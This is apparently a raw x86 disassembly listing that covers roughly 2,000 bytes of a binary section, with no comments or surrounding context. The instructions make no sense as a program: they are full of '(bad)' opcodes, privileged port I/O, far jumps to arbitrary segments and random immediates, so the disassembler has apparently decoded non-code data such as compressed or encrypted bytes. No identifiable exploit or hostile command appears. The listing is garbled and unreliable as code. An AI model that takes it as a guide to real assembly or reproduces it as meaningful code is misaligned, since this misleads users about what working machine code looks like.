  4174f6:	les    esi,FWORD PTR [ebp+0xe]
  4174f9:	shl    BYTE PTR [eax],1
  4174fb:	imul   esp,ecx,0xfffffff4
  4174fe:	mov    bl,0x52
  417500:	sub    ah,BYTE PTR [eax]
  417502:	test   BYTE PTR [edx+0x22e516ed],dl
  417508:	std    
  417509:	cwde   
  41750a:	sub    eax,0x9e820aa
  41750f:	es out dx,eax
  417511:	ja     0x41756a
  417513:	mov    dh,0xef
  417515:	ins    BYTE PTR es:[edi],dx
  417516:	jle    0x41754b
  417518:	clc    
  417519:	bound  edi,QWORD PTR [ebx+0x66501648]
  41751f:	sbb    al,0xc7
  417521:	sbb    DWORD PTR [esi-0x6fd8ccd8],ebx
  417527:	leave  
  417528:	dec    esp
  417529:	pop    esp
  41752a:	std    
  41752b:	mov    al,ds:0xc31947f5
  417530:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417531:	popa   
  417532:	out    dx,al
  417533:	mov    WORD PTR [edx+0x3f],es
  417536:	(bad)  
  417538:	repnz inc esi
  41753a:	pop    ds
  41753b:	xchg   DWORD PTR [eax-0x19],eax
  41753e:	or     al,0xf4
  417540:	push   eax
  417541:	sbb    BYTE PTR [edx-0x25],al
  417544:	xchg   edi,eax
  417545:	outs   dx,DWORD PTR ds:[esi]
  417546:	lods   eax,DWORD PTR ds:[esi]
  417547:	je     0x417520
  417549:	loop   0x4175ac
  41754b:	popa   
  41754c:	push   cs
  41754d:	gs and al,0xce
  417550:	pop    ebp
  417551:	out    dx,al
  417552:	sbb    ch,bl
  417554:	pushf  
  417555:	sub    ah,bh
  417557:	push   0xb58e539e
  41755c:	xor    DWORD PTR [eax-0x39],ebp
  41755f:	mov    cl,0xee
  417561:	sbb    ecx,DWORD PTR [edi+0x10]
  417564:	clc    
  417565:	dec    ebx
  417567:	or     BYTE PTR [eax],ah
  417569:	sbb    bh,BYTE PTR ds:0x1602d05
  41756f:	aam    0x2f
  417571:	lods   eax,DWORD PTR ds:[esi]
  417572:	fist   DWORD PTR [eax-0x7]
  417575:	pop    ecx
  417576:	lea    edi,[eax+0x4ff93459]
  41757c:	jmp    0x2072baa7
  417581:	mov    ebp,DWORD PTR [eax*4-0x145e58d0]
  417588:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417589:	out    dx,al
  41758a:	bound  eax,QWORD PTR [ecx+eax*4-0x459eaee6]
  417591:	push   ebp
  417592:	aas    
  417593:	mov    esi,0xd52f06c
  417598:	push   ecx
  417599:	cs jne 0x4175b0
  41759c:	pushf  
  41759d:	imul   edi,DWORD PTR [esi+0x77],0xe3785fad
  4175a4:	or     esi,DWORD PTR [ebp+0x5cd914c5]
  4175aa:	(bad)  
  4175ab:	rol    DWORD PTR [edi-0x6128eab4],1
  4175b1:	pop    es
  4175b2:	mov    eax,0x55270b65
  4175b7:	sbb    al,0xb9
  4175b9:	xlat   BYTE PTR ds:[ebx]
  4175ba:	jg     0x4175b6
  4175bc:	sbb    BYTE PTR [ebx-0x2bb59f1d],dl
  4175c2:	add    esp,DWORD PTR [esi+edx*1-0x30f3dcb2]
  4175c9:	xor    edx,DWORD PTR [ecx*8-0x108c160e]
  4175d0:	adc    al,0x4f
  4175d2:	jmp    0x58ad:0xcc622a9c
  4175d9:	jge    0x417606
  4175db:	cmp    bl,dh
  4175dd:	pop    ss
  4175de:	inc    esi
  4175df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4175e0:	inc    ecx
  4175e1:	imul   ebx,ebp,0xffffffb7
  4175e4:	hlt    
  4175e5:	jmp    0x22e9696b
  4175ea:	nop
  4175eb:	rcr    DWORD PTR [esi-0x3c],cl
  4175ee:	jmp    0x417666
  4175f0:	xchg   ecx,eax
  4175f1:	jo     0x417601
  4175f3:	sub    eax,0x3d36357c
  4175f8:	or     DWORD PTR [esi+0x5ba02e9],0x327d58c3
  417602:	mov    ecx,0x216a4d22
  417607:	mov    dh,0x24
  417609:	push   ebx
  41760a:	cmp    bl,BYTE PTR [edi-0x36]
  41760d:	cmp    eax,0x79077256
  417612:	push   0xab515974
  417617:	adc    ecx,DWORD PTR [ebx]
  417619:	mov    ecx,0xd6ced5dd
  41761e:	repnz ins DWORD PTR es:[edi],dx
  417620:	fnstsw WORD PTR [ebx]
  417622:	dec    ebx
  417623:	iret   
  417624:	(bad)  
  417626:	dec    edi
  417627:	mov    dl,0xf9
  417629:	out    dx,eax
  41762a:	push   edx
  41762b:	leave  
  41762c:	push   edi
  41762d:	push   ecx
  41762e:	call   0xb612:0xb7d15d32
  417635:	nop
  417636:	shl    DWORD PTR [ebx-0x5a],1
  417639:	loop   0x417655
  41763b:	push   ebx
  41763c:	sub    eax,0xa2604119
  417641:	fs add eax,0xed7d35d6
  417647:	pop    ss
  417648:	xchg   esp,eax
  417649:	and    bh,bl
  41764b:	jo     0x4176be
  41764d:	sti    
  41764e:	xor    BYTE PTR [ecx],0xb2
  417651:	mov    dl,dl
  417653:	push   ebp
  417654:	pop    es
  417655:	rcr    al,1
  417657:	jp     0x4176a5
  417659:	adc    BYTE PTR [ebp+0x58],dh
  41765c:	stos   BYTE PTR es:[edi],al
  41765d:	div    BYTE PTR [edi]
  41765f:	out    0x37,al
  417661:	fcmove st,st(1)
  417663:	inc    ecx
  417664:	add    bh,BYTE PTR [edi+0x2c]
  417667:	outs   dx,DWORD PTR ds:[esi]
  417668:	jge    0x41765f
  41766a:	out    dx,al
  41766b:	xchg   ecx,eax
  41766c:	std    
  41766d:	jo     0x4176ee
  41766f:	and    ecx,edi
  417671:	test   eax,0x94e726d9
  417676:	fmulp  st(0),st
  417678:	dec    edx
  417679:	xor    eax,0xc90c0f30
  41767e:	cli    
  41767f:	jb     0x41763d
  417681:	inc    ebx
  417682:	hlt    
  417683:	cmp    DWORD PTR [eax],0xb2d5696a
  417689:	xchg   ch,cl
  41768b:	sti    
  41768c:	in     eax,0xa6
  41768e:	xor    eax,0xf85c7ecc
  417693:	mov    WORD PTR [ebx+0x5e50f691],es
  417699:	or     eax,0x2fce74d
  41769e:	outs   dx,BYTE PTR ds:[esi]
  41769f:	and    dh,BYTE PTR [edi+ebp*4-0x50]
  4176a3:	add    al,0xb1
  4176a5:	add    al,0x82
  4176a7:	rol    DWORD PTR [esi-0x6c5b6725],0xe7
  4176ae:	pop    eax
  4176af:	or     al,0x75
  4176b1:	dec    edi
  4176b2:	jnp    0x41767e
  4176b4:	mov    bl,0x5f
  4176b6:	jl     0x417693
  4176b8:	sti    
  4176b9:	jb     0x417687
  4176bb:	mov    ds:0x371b854b,eax
  4176c0:	stc    
  4176c1:	prefetcht1 BYTE PTR [ebp+0x51207600]
  4176c8:	sub    BYTE PTR [esi+edx*4+0x47],dl
  4176cc:	cli    
  4176cd:	xchg   cl,bl
  4176cf:	xchg   ebx,eax
  4176d0:	fucom  st(4)
  4176d2:	les    edi,FWORD PTR [edx+0x395ebb8b]
  4176d8:	sbb    edx,DWORD PTR [ecx+0x57f61fa3]
  4176de:	xchg   ebp,eax
  4176df:	xchg   ecx,eax
  4176e0:	xchg   BYTE PTR [ebx],ch
  4176e2:	cld    
  4176e3:	(bad)
  4176e7:	jecxz  0x41766d
  4176e9:	jge    0x4176c5
  4176eb:	and    BYTE PTR [edx-0x19],dl
  4176ee:	rcl    BYTE PTR [edi+0x8dd25be],1
  4176f4:	add    esp,edx
  4176f6:	sub    esp,edi
  4176f8:	cmp    eax,0x995ab716
  4176fd:	mov    ebx,0x1574a26f
  417702:	pop    ecx
  417703:	pop    eax
  417704:	xchg   edx,eax
  417705:	xchg   ah,al
  417707:	out    0xc1,eax
  417709:	rcl    BYTE PTR [edi-0x6e],0x79
  41770d:	jbe    0x4176ec
  41770f:	push   ds
  417710:	pushf  
  417711:	jg     0x4176ad
  417713:	cmp    ebp,DWORD PTR [ebx]
  417715:	fs pop esi
  417717:	cmp    esi,0x90e9fd5a
  41771d:	gs pop esi
  41771f:	mov    ebx,0xa9ceeb7e
  417724:	xlat   BYTE PTR ds:[ebx]
  417725:	fbld   TBYTE PTR [edi+0x2f]
  417728:	push   edx
  417729:	ins    BYTE PTR es:[edi],dx
  41772a:	jl     0x41774f
  41772c:	pop    ds
  41772d:	test   BYTE PTR [ebp+eax*8+0x34],bl
  417731:	js     0x4176c5
  417733:	inc    eax
  417734:	mov    al,ds:0x3b39dd58
  417739:	mov    eax,0x8a57b847
  41773e:	dec    edx
  41773f:	test   BYTE PTR [ebx+0x2cf97025],bl
  417745:	hlt    
  417746:	mov    ecx,0xa410752b
  41774b:	mov    ds:0xfc750fbd,al
  417750:	lea    eax,[ebx+edi*2-0x10]
  417754:	mov    edx,0xea80f659
  417759:	out    dx,al
  41775a:	mov    dl,0xc6
  41775c:	in     eax,dx
  41775d:	arpl   WORD PTR ds:0x34589686,bp
  417763:	sub    BYTE PTR [ecx-0x4f637c55],dl
  417769:	data16 cmp bh,BYTE PTR [edi-0x1d326511]
  417770:	(bad)  
  417771:	clc    
  417772:	sbb    al,0xb1
  417774:	retf   
  417775:	retf   
  417776:	cmc    
  417777:	sar    BYTE PTR [ecx],1
  417779:	lods   eax,DWORD PTR ds:[esi]
  41777a:	test   eax,0x9922b34a
  41777f:	mov    dl,0xc9
  417781:	or     al,0xf0
  417783:	stos   DWORD PTR es:[edi],eax
  417784:	push   esp
  417785:	cmp    DWORD PTR [edx],esi
  417787:	xor    BYTE PTR [esi-0x3e],cl
  41778a:	fwait
  41778b:	add    eax,0x3a7127f4
  417790:	adc    DWORD PTR [edi-0x6f36dd],0xffffffbf
  417797:	in     al,dx
  417798:	mov    ds:0x1d33d360,al
  41779d:	dec    esi
  41779e:	dec    eax
  41779f:	popa   
  4177a0:	bound  ebx,QWORD PTR [esp+eiz*4+0x53]
  4177a4:	pop    DWORD PTR [ecx-0x77af37d3]
  4177aa:	adc    al,dh
  4177ac:	daa    
  4177ad:	imul   edx,DWORD PTR [ebx],0x54fbc8c6
  4177b3:	in     al,dx
  4177b4:	mov    bl,al
  4177b6:	ret    
  4177b7:	imul   ecx,DWORD PTR [eax-0x4b307ddf],0x59
  4177be:	inc    edx
  4177bf:	mov    DWORD PTR [eax],ecx
  4177c1:	and    ah,BYTE PTR [edx-0x7]
  4177c4:	adc    BYTE PTR [ebx],cl
  4177c6:	cwde   
  4177c7:	inc    ebp
  4177c8:	popf   
  4177c9:	inc    ecx
  4177ca:	mov    BYTE PTR [edi+0x1ba81e9f],cl
  4177d0:	inc    esi
  4177d1:	fidivr WORD PTR [ebx-0x53]
  4177d4:	loopne 0x417764
  4177d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4177d7:	and    ah,bl
  4177d9:	jle    0x41775f
  4177db:	pushf  
  4177dc:	in     al,dx
  4177dd:	sub    dh,al
  4177df:	mov    es:0x18034842,al
  4177e5:	xchg   edx,eax
  4177e6:	imul   esp,DWORD PTR [edx-0x63],0x49
  4177ea:	in     eax,dx
  4177eb:	xchg   ebx,eax
  4177ec:	mov    bl,0x55
  4177ee:	add    DWORD PTR [ebp+0x3e],esp
  4177f1:	test   eax,0xa70dd04b
  4177f6:	lds    esi,FWORD PTR [edx-0x5e]
  4177f9:	sub    al,0x56
  4177fb:	cdq    
  4177fc:	js     0x4177a6
  4177fe:	in     eax,dx
  4177ff:	and    edx,0xffffffcb
  417802:	mov    ?,WORD PTR [edi-0x5de1145f]
  417808:	popa   
  417809:	xchg   ecx,eax
  41780a:	dec    esi
  41780b:	out    dx,eax
  41780c:	call   0x9d86:0x544c0d04
  417813:	jecxz  0x41783d
  417815:	sub    al,0x5c
  417817:	jmp    0x4177d2
  417819:	push   esi
  41781a:	cmp    al,0x9a
  41781c:	repnz pusha 
  41781e:	push   eax
  41781f:	mov    al,0xc9
  417821:	xlat   BYTE PTR ds:[ebx]
  417822:	push   ss
  417823:	fld    TBYTE PTR [ecx+0x2f5e9031]
  417829:	pop    ecx
  41782a:	jns    0x417852
  41782c:	in     al,dx
  41782d:	jl     0x4177c0
  41782f:	aam    0x65
  417831:	aam    0xa3
  417833:	jl     0x43201dca
  417839:	bnd je 0x4177d6
  41783c:	sbb    BYTE PTR [ebx-0x2a],dl
  41783f:	iret   
  417840:	test   bl,bl
  417842:	pop    ebx
  417843:	fsub   st,st(3)
  417845:	fdiv   QWORD PTR [edi+0x10710ea2]
  41784b:	scas   eax,DWORD PTR es:[edi]
  41784c:	mov    dh,0xba
  41784e:	out    0xde,al
  417850:	xchg   ebp,eax
  417851:	mov    ah,0xa2
  417853:	enter  0x85d0,0xcb
  417857:	pop    edi
  417858:	jo     0x41782c
  41785a:	mov    ss,WORD PTR [edx+0x56a89f95]
  417860:	dec    esi
  417861:	mov    DWORD PTR [eax+eiz*4-0x1b],ebx
  417865:	mov    ds:0x6fef3a98,al
  41786a:	repnz mov esp,0xd92cff6f
  417870:	jns    0x417882
  417872:	hlt    
  417873:	xchg   ebx,eax
  417874:	sub    eax,0xe0343ec7
  417879:	cdq    
  41787a:	add    bh,ah
  41787c:	fcomi  st,st(0)
  41787e:	mov    bh,0x44
  417880:	pop    edx
  417881:	ja     0x417823
  417883:	fcmovu st,st(2)
  417885:	ins    DWORD PTR es:[edi],dx
  417886:	or     DWORD PTR [edx],ebx
  417888:	mov    ds:0x13f55240,al
  41788d:	fbstp  TBYTE PTR [ebx+0x5600244a]
  417893:	cdq    
  417894:	pop    esp
  417895:	xchg   BYTE PTR [edx+edi*2+0x46],bh
  417899:	xchg   edi,eax
  41789a:	fwait
  41789b:	in     al,dx
  41789c:	xchg   esi,eax
  41789d:	clc    
  41789e:	inc    ebp
  41789f:	scas   eax,DWORD PTR es:[edi]
  4178a0:	(bad)  
  4178a1:	in     al,0xee
  4178a3:	xchg   ebp,eax
  4178a4:	outs   dx,DWORD PTR ds:[esi]
  4178a5:	jmp    0x4841b4bf
  4178aa:	cmp    DWORD PTR [eax+0x4b21faaa],ebx
  4178b0:	dec    ebx
  4178b1:	cmp    eax,0x4b08d941
  4178b6:	xor    eax,DWORD PTR [ecx+0x146561d2]
  4178bc:	dec    ebx
  4178bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4178be:	loope  0x417874
  4178c0:	mov    DWORD PTR ds:0xb310a103,edx
  4178c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178c7:	leave  
  4178c8:	mov    ch,0x37
  4178ca:	sub    bh,0x41
  4178cd:	inc    esi
  4178ce:	xor    BYTE PTR [edx-0x1d],bl
  4178d1:	jo     0x4178a3
  4178d3:	int3   
  4178d4:	shl    WORD PTR [esp+ebp*2],1
  4178d8:	(bad)  
  4178d9:	sbb    ecx,DWORD PTR [ebx]
  4178db:	mov    dh,0x6c
  4178dd:	add    edi,esp
  4178df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4178e0:	push   ebp
  4178e1:	call   0x3d8b:0x25107001
  4178e8:	test   BYTE PTR [ecx+0x52],bl
  4178eb:	adc    dh,al
  4178ed:	es sbb eax,0xc9a707d
  4178f3:	lea    esp,[eax+ebx*1]
  4178f6:	mov    ch,0xf7
  4178f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4178f9:	mov    ebx,0x17766990
  4178fe:	dec    ebx
  4178ff:	mov    edx,0x2906074d
  417904:	mov    ch,0xa6
  417906:	xchg   ecx,eax
  417907:	mov    ah,0xd4
  417909:	push   esp
  41790a:	pusha  
  41790b:	aad    0xfe
  41790d:	scas   eax,DWORD PTR es:[edi]
  41790e:	stc    
  41790f:	xchg   esp,eax
  417910:	inc    ebp
  417911:	dec    edx
  417912:	imul   ebx,DWORD PTR [eax-0x632f4750],0x32
  417919:	int3   
  41791a:	loope  0x41792d
  41791c:	inc    ebx
  41791d:	xor    DWORD PTR [eax+0x14139798],0x5af314f1
  417927:	gs aas 
  417929:	jnp    0x417970
  41792b:	outs   dx,DWORD PTR ds:[esi]
  41792c:	pop    es
  41792d:	imul   edx,DWORD PTR [esi],0x6b6a9c11
  417933:	popf   
  417934:	in     eax,0x7c
  417936:	cmc    
  417937:	pop    edi
  417938:	sub    ah,BYTE PTR ds:0x755e0f1b
  41793e:	mov    ebx,DWORD PTR [ecx-0x533e176d]
  417944:	jl     0x417931
  417946:	add    dl,dh
  417948:	iret   
  417949:	cli    
  41794a:	mov    ch,0x2f
  41794c:	dec    ecx
  41794d:	add    BYTE PTR es:[ebx-0x14],al
  417951:	mov    eax,0x26ee5af2
  417956:	bound  ebp,QWORD PTR [ecx-0x7b]
  417959:	push   edi
  41795a:	xchg   esp,eax
  41795b:	sub    bh,bh
  41795d:	jmp    0xf414:0xa603fd76
  417964:	pop    ebx
  417965:	arpl   WORD PTR [esi+0x7238d900],di
  41796b:	lods   eax,DWORD PTR ds:[esi]
  41796c:	add    DWORD PTR [ebx-0x642fed4f],esp
  417972:	jge    0x4179db
  417974:	sbb    ecx,ebp
  417976:	(bad)  
  417977:	stc    
  417978:	cmc    
  417979:	int    0x6b
  41797b:	test   BYTE PTR [ecx+0x7],al
  41797e:	jmp    0x417981
  417980:	popa   
  417981:	pop    edi
  417982:	in     al,dx
  417983:	xchg   edi,eax
  417984:	xchg   ebp,eax
  417985:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417986:	and    bh,BYTE PTR [eax+0x26da7e14]
  41798c:	gs pop esp
  41798e:	mov    ch,0x9b
  417990:	push   es
  417991:	pop    esi
  417992:	rcr    DWORD PTR [ebx+0x70dcd7ac],0x60
  417999:	test   eax,0xf7564fcc
  41799e:	jle    0x41794c
  4179a0:	repz add ch,al
  4179a3:	push   esp
  4179a4:	ja     0x417948
  4179a6:	(bad)  
  4179a7:	xor    esi,DWORD PTR [edx]
  4179a9:	ds xor al,0xf8
  4179ac:	scas   eax,DWORD PTR es:[edi]
  4179ad:	inc    eax
  4179ae:	cmp    DWORD PTR [edi+0x442b24a3],esp
  4179b4:	inc    edi
  4179b5:	lods   eax,DWORD PTR ds:[esi]
  4179b6:	mov    eax,ds:0x3830acd7
  4179bb:	add    BYTE PTR [edi-0x4c],dh
  4179be:	stc    
  4179bf:	sub    eax,0x63ba5d0d
  4179c4:	sub    ch,ch
  4179c6:	cmp    bh,dh
  4179c8:	mov    esi,0x666d1b1d
  4179cd:	xor    ebx,DWORD PTR [edx-0x10]
  4179d0:	jg     0x417a13
  4179d2:	sbb    BYTE PTR [ebx+ebp*8],0xf3
  4179d6:	and    eax,0x8a8bb396
  4179db:	inc    edi
  4179dc:	sbb    DWORD PTR [eax-0x40],esp
  4179df:	cmp    DWORD PTR [ebp-0x1331f247],ecx
  4179e5:	xchg   ecx,eax
  4179e6:	ins    BYTE PTR es:[edi],dx
  4179e7:	js     0x41796d
  4179e9:	in     eax,dx
  4179ea:	pop    ss
  4179eb:	test   al,0x99
  4179ed:	sbb    al,0x6f
  4179ef:	stos   BYTE PTR es:[edi],al
  4179f0:	ret    0x2763
  4179f3:	adc    esp,eax
  4179f5:	add    cl,BYTE PTR [edi]
  4179f7:	mov    ebp,0xc68cd28d
  4179fc:	mov    ds:0x2a60343b,al
  417a01:	jno    0x417a4e
  417a03:	mov    bh,0x56
  417a05:	mov    bh,0x2d
  417a07:	xchg   esp,eax
  417a08:	add    BYTE PTR [eax],0x47
  417a0b:	push   ebx
  417a0c:	mov    eax,0x9365ca46
  417a11:	add    eax,0x4a0f4541
  417a16:	pushf  
  417a17:	cwde   
  417a18:	test   BYTE PTR [edi],al
  417a1a:	or     edx,eax
  417a1c:	icebp  
  417a1d:	dec    eax
  417a1e:	push   0x26
  417a20:	aam    0x37
  417a22:	mov    eax,0x445b986
  417a27:	data16 and al,0xe6
  417a2a:	es sbb eax,0x6348d615
  417a30:	mov    dh,0xc8
  417a32:	inc    esp
  417a33:	cmp    BYTE PTR [eax],0xee
  417a36:	fincstp 
  417a38:	scas   al,BYTE PTR es:[edi]
  417a39:	lods   al,BYTE PTR ds:[esi]
  417a3a:	fwait
  417a3b:	sub    BYTE PTR [ebx-0x60e8de86],0xb4
  417a42:	sbb    al,0x5c
  417a44:	fistp  QWORD PTR [edi+ebp*8+0x3e]
  417a48:	hlt    
  417a49:	and    DWORD PTR [eax+0x3ef16ce8],ebp
  417a4f:	pop    edi
  417a50:	(bad)  
  417a51:	out    0xf8,eax
  417a53:	adc    cl,cl
  417a55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a56:	pop    esp
  417a57:	leave  
  417a58:	mov    ds:0x53e4ec1,al
  417a5d:	cmp    BYTE PTR [edx+eax*8],0xc0
  417a61:	push   edi
  417a62:	mov    ebp,0x885132f1
  417a67:	(bad)  
  417a68:	push   edx
  417a69:	pusha  
  417a6a:	ficomp DWORD PTR [ebx]
  417a6c:	inc    esi
  417a6d:	cmp    al,0xe0
  417a6f:	adc    DWORD PTR [edi-0x48],0xb
  417a73:	(bad)  
  417a74:	out    0x36,al
  417a76:	int3   
  417a77:	and    eax,0x8697d677
  417a7c:	js     0x417ac5
  417a7e:	mov    cl,0xff
  417a80:	xor    al,0x24
  417a82:	fisttp WORD PTR [esi-0x408e9f08]
  417a88:	(bad)
  417a8b:	fidivr WORD PTR [ebx]
  417a8d:	leave  
  417a8e:	pop    ss
  417a8f:	sub    eax,0x4eb51377
  417a94:	iret   
  417a95:	push   eax
  417a96:	aaa    
  417a97:	dec    eax
  417a98:	pop    ebp
  417a99:	into   
  417a9a:	(bad)  
  417a9b:	push   ebp
  417a9c:	mov    ?,WORD PTR [ebx]
  417a9e:	mov    eax,0xcb7df2cd
  417aa3:	lods   al,BYTE PTR ds:[esi]
  417aa4:	rcl    DWORD PTR [eax+0x66],0x54
  417aa8:	add    ah,ch
  417aaa:	pop    ebp
  417aab:	pop    ds
  417aac:	pop    esi
  417aad:	inc    esp
  417aae:	lods   eax,DWORD PTR ds:[esi]
  417aaf:	lods   eax,DWORD PTR ds:[esi]
  417ab0:	cmp    edx,DWORD PTR [edi]
  417ab2:	aam    0x49
  417ab4:	mov    edx,ebx
  417ab6:	or     al,0x2f
  417ab8:	jno    0x417a76
  417aba:	xchg   al,bh
  417abc:	jp     0x417a59
  417abe:	push   ebp
  417abf:	retf   
  417ac0:	dec    esi
  417ac1:	test   al,0x8
  417ac3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ac4:	ret    
  417ac5:	mov    esi,0xfe424315
  417aca:	jo     0x417a6d
  417acc:	cmp    BYTE PTR [eax-0x27],ch
  417acf:	jecxz  0x417b37
  417ad1:	(bad)  
  417ad2:	mov    al,ds:0xfc12ef21
  417ad7:	repnz sti 
  417ad9:	jo     0x417aaa
  417adb:	inc    edx
  417adc:	out    dx,al
  417add:	ror    DWORD PTR [ebp+0x4],cl
  417ae0:	lahf   
  417ae1:	shl    DWORD PTR [ecx+edi*2-0x41],1
  417ae5:	aad    0xd5
  417ae7:	test   BYTE PTR [edi+0x4b4de3e],cl
  417aed:	mov    cl,0x2
  417aef:	pop    ss
  417af0:	pop    esi
  417af1:	mov    ch,BYTE PTR [ebx]
  417af3:	mov    edi,0xbb3ea4db
  417af8:	call   FWORD PTR ds:0x4c1a0195
  417afe:	jne    0x417ad9
  417b00:	push   esp
  417b01:	ins    BYTE PTR es:[edi],dx
  417b02:	in     eax,0xfd
  417b04:	popf   
  417b05:	hlt    
  417b06:	and    BYTE PTR [ebp-0x55],ah
  417b09:	arpl   WORD PTR [edi+0x73f2ecfb],dx
  417b0f:	stc    
  417b10:	add    cl,BYTE PTR ds:0xe2941114
  417b16:	outs   dx,BYTE PTR ds:[esi]
  417b17:	push   ds
  417b18:	push   edx
  417b19:	into   
  417b1a:	xor    eax,DWORD PTR [edx]
  417b1c:	dec    eax
  417b1d:	ss fmul DWORD PTR es:[edx]
  417b21:	mov    ds:0x493a4a54,eax
  417b26:	ins    BYTE PTR es:[edi],dx
  417b27:	ss cdq 
  417b29:	jnp    0x417b54
  417b2b:	es (bad) 
  417b2d:	fnstenv [edi+eiz*2]
  417b30:	sub    DWORD PTR [edi-0x2e9c8787],esi
  417b36:	jne    0x417b1d
  417b38:	and    esi,DWORD PTR [edx-0xd]
  417b3b:	inc    eax
  417b3c:	(bad)  
  417b3d:	fcmove st,st(5)
  417b3f:	call   0x918d:0xdc3e0136
  417b46:	cmp    eax,0xc7adf18d
  417b4b:	idiv   BYTE PTR [edx+edi*8-0xbfdc26a]
  417b52:	pusha  
  417b53:	outs   dx,DWORD PTR ds:[esi]
  417b54:	pop    eax
  417b55:	mov    ah,0xad
  417b57:	mov    dh,0x4a
  417b59:	punpckldq mm2,DWORD PTR [ebp+0x7f70b3eb]
  417b60:	lahf   
  417b61:	repnz fstp QWORD PTR [eax-0x6f0779ba]
  417b68:	sbb    BYTE PTR [ecx-0x58],al
  417b6b:	dec    edx
  417b6c:	add    cl,dl
  417b6e:	add    ecx,DWORD PTR [ebx-0x79]
  417b71:	inc    esp
  417b72:	test   BYTE PTR [esi+0x7a],ch
  417b75:	dec    eax
  417b76:	sub    eax,0xa618340
  417b7b:	push   ebx
  417b7c:	fld    st(5)
  417b7e:	fwait
  417b7f:	pop    esp
  417b80:	cmp    DWORD PTR [edx-0x7b],eax
  417b83:	es xchg esi,eax
  417b85:	mov    BYTE PTR ds:0xa78edb64,dh
  417b8b:	test   al,0x48
  417b8d:	dec    esp
  417b8e:	pop    ss
  417b8f:	push   ebx
  417b90:	mov    edx,0x6dd54e4f
  417b95:	or     ebx,DWORD PTR [edx]
  417b97:	xchg   ebp,eax
  417b98:	cmc    
  417b99:	sub    BYTE PTR [ebx+0x35],al
  417b9c:	pop    ss
  417b9d:	cmc    
  417b9e:	jecxz  0x417b64
  417ba0:	jmp    FWORD PTR [esi+edi*1]
  417ba3:	iret   
  417ba4:	enter  0x3986,0xe8
  417ba8:	jno    0x417b2e
  417baa:	mov    edx,0xe21ff8ff
  417baf:	ja     0x417b9c
  417bb1:	mov    bh,BYTE PTR [ecx+eiz*4]
  417bb4:	stos   BYTE PTR es:[edi],al
  417bb5:	hlt    
  417bb6:	int3   
  417bb7:	cmp    al,0xc
  417bb9:	daa    
  417bba:	mov    esp,0xa19dc98e
  417bbf:	ds out dx,eax
  417bc1:	pop    ecx
  417bc2:	mov    al,0xcd
  417bc4:	push   0xffffffb3
  417bc6:	data16 in al,dx
  417bc8:	clc    
  417bc9:	inc    esi
  417bca:	push   cs
  417bcb:	pushf  
  417bcc:	fimul  DWORD PTR [edi]
  417bce:	push   edx
  417bcf:	push   ebx
  417bd0:	and    esp,esi
  417bd2:	add    eax,0xb762939
  417bd7:	les    eax,FWORD PTR [ebx]
  417bd9:	(bad)  
  417bda:	cmp    al,0x8f
  417bdc:	ins    BYTE PTR es:[edi],dx
  417bdd:	dec    BYTE PTR [ecx+0x159ff428]
  417be3:	dec    esp
  417be4:	xor    al,0x92
  417be6:	sbb    ebx,edx
  417be8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417be9:	sbb    al,0xb6
  417beb:	sub    DWORD PTR [edx],ebx
  417bed:	in     eax,0xfe
  417bef:	mov    fs,WORD PTR [ebp-0x20]
  417bf2:	jp     0x417c02
  417bf4:	or     al,0xda
  417bf6:	xchg   edi,eax
  417bf7:	nop
  417bf8:	push   ebp
  417bf9:	hlt    
  417bfa:	pop    eax
  417bfb:	adc    ch,dl
  417bfd:	push   ss
  417bfe:	(bad)  
  417bff:	call   0x3d5dc928
  417c04:	pop    ss
  417c05:	mov    ecx,0x35d9631f
  417c0a:	nop
  417c0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c0c:	pop    edx
  417c0d:	jne    0x417bca
  417c0f:	icebp  
  417c10:	mov    al,ds:0xbe7cc008
  417c15:	xchg   edx,eax
  417c16:	mov    esi,DWORD PTR [ecx-0x56]
  417c19:	push   ebp
  417c1a:	and    esp,DWORD PTR [ebx]
  417c1c:	enter  0xa05b,0x9c
  417c20:	pop    ecx
  417c21:	bnd ret 0x2b2d
  417c25:	neg    DWORD PTR [esp+ecx*2-0x26]
  417c29:	push   ss
  417c2a:	add    cl,dl
  417c2c:	xor    BYTE PTR ds:0x24c527c7,0xee
  417c33:	bound  edx,QWORD PTR [eax+0xcd4ac54]
  417c39:	push   edi
  417c3a:	mov    DWORD PTR [ecx-0xb00341],eax
  417c40:	xchg   BYTE PTR [ebx-0x6429db24],ah
  417c46:	js     0x417bff
  417c48:	(bad)  
  417c49:	mov    al,0xdb
  417c4b:	dec    edx
  417c4c:	shl    DWORD PTR [edx],0x8e
  417c4f:	sbb    al,dl
  417c51:	sbb    esp,DWORD PTR [edx-0x27]
  417c54:	jl     0x417c46
  417c56:	jl     0x417c9e
  417c58:	jb     0x417c40
  417c5a:	ret    0xfad5
  417c5d:	sbb    eax,0xdb56f94
  417c62:	loop   0x417c38
  417c64:	aad    0x2e
  417c66:	xor    eax,0xad4992c6
  417c6b:	add    al,0xc7
  417c6d:	inc    ebp
  417c6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c70:	sahf   
  417c71:	push   esi
  417c72:	int3   
  417c73:	jne    0x417c00
  417c75:	sti    
  417c76:	jge    0x417c36
  417c78:	stos   BYTE PTR es:[edi],al
  417c79:	in     eax,0xe6
  417c7b:	adc    ebp,DWORD PTR [eax-0x6428c8d8]
  417c81:	aam    0x54
  417c83:	inc    ecx
  417c84:	xchg   BYTE PTR [ebp+0x74],ah
  417c87:	mov    edi,0x2da53a8f
  417c8c:	xor    al,0x9a
  417c8e:	xchg   esp,eax
  417c8f:	xchg   ecx,eax
  417c90:	fist   DWORD PTR [ecx-0x5a]
  417c93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c94:	imul   edi,edi,0xbbd7fd5a
  417c9a:	jno    0x417c35
